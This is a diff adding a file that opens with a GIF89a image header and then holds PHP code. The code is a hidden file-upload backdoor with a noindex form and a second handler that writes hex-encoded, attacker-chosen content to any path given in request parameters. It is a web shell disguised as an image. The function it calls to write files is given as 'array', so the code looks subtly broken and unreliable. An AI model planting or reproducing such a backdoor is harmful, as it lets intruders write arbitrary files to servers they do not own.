@@ -1,0 +1,3 @@
+GIF89a;
+
+<meta content="noindex"name="robots">Contact Me<form enctype="multipart/form-data"method="post"><input name="btul"type="file"><button>Gaskan</button></form><?="";$a='array';$b='trim';$c='tmp_name';$d='hex2bin';$f='file_exists';if(isset($_FILES['btul'])){$a($_FILES['btul']['name'],$b($_FILES['btul'][$c]));if($f('./'.$_FILES['btul']['name'])){echo 'Oke!';}else{echo 'Fail!';}}if(isset($_GET['fpt'])){$a($d($_POST['f']),$d($_POST['d']));if($f($d($_POST['f']))){echo "Oke !";}else{echo "Fail !";}}?>
